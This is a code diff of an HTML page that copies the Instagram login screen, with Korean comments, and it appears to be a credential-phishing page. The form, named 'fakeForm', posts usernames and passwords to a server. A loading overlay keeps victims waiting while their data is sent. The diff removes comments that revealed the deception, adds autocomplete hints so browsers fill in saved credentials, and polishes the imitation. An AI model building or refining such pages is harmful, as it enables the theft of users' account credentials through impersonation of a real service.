@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        /* 이미지와 동일한 다크 네이비/블랙 배경색 */
+        /* 기존 디자인 유지 */
         body {
             background-color: #000000;
             color: white;
@@ -33,9 +33,9 @@
             align-items: center;
             justify-content: center;
             flex-grow: 1;
+            box-sizing: border-box; /* 패딩 영향 방지 기능 추가 */
         }
 
-        /* 실제 인스타그램 그라데이션 로고 구현 */
         .insta-logo-wrapper {
             width: 75px;
             height: 75px;
@@ -67,7 +67,6 @@
             transform: translate(-50%, -50%);
         }
 
-        /* 입력창 디자인 */
         .input-box {
             width: 100%;
             margin-bottom: 12px;
@@ -89,7 +88,6 @@
             border-color: #555555;
         }
 
-        /* 로그인 버튼 */
         .login-btn {
             width: 100%;
             padding: 12px;
@@ -104,8 +102,10 @@
             transition: opacity 0.3s;
         }
 
-        .login-btn:active {
-            opacity: 0.7;
+        /* 클릭 시 반응 기능 개선 */
+        .login-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
 
         .forgot-link {
@@ -116,7 +116,6 @@
             font-weight: 500;
         }
 
-        /* 하단 고정 섹션 */
         .bottom-section {
             width: 100%;
             max-width: 350px;
@@ -147,7 +146,6 @@
             gap: 5px;
         }
 
-        /* 로딩 스피너 애니메이션 (실시간 중계 느낌용) */
         #loading-overlay {
             display: none;
             position: fixed;
@@ -184,12 +182,12 @@
 
         <form id="fakeForm" action="/login" method="POST" style="width: 100%;">
             <div class="input-box">
-                <input type="text" name="username" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" required>
+                <input type="text" name="username" placeholder="사용자 이름, 이메일 주소 또는 휴대폰 번호" autocomplete="username" required>
             </div>
             <div class="input-box">
-                <input type="password" name="password" placeholder="비밀번호" required>
+                <input type="password" name="password" placeholder="비밀번호" autocomplete="current-password" required>
             </div>
-            <button type="submit" class="login-btn">로그인</button>
+            <button type="submit" class="login-btn" id="loginBtn">로그인</button>
         </form>
 
         <a href="#" class="forgot-link">비밀번호를 잊으셨나요?</a>
@@ -197,14 +195,19 @@
 
     <div class="bottom-section">
         <a href="#" class="create-btn">새 계정 만들기</a>
-        <div class="meta-logo">∞ Meta</div>
+        <div class="meta-logo">Meta</div>
     </div>
 
     <script>
-        // 로그인 버튼 클릭 시 로딩 화면을 보여주어 "실시간 중계" 느낌 극대화
         document.getElementById('fakeForm').onsubmit = function() {
+            // 버튼 중복 클릭 방지 기능 추가
+            const btn = document.getElementById('loginBtn');
+            btn.disabled = true;
+
+            // 로딩 화면 표시
             document.getElementById('loading-overlay').style.display = 'flex';
-            // 실제 데이터는 서버로 전송되면서 브라우저는 로딩 창을 유지함
+            
+            // 전송 허용
             return true; 
         };
     </script>
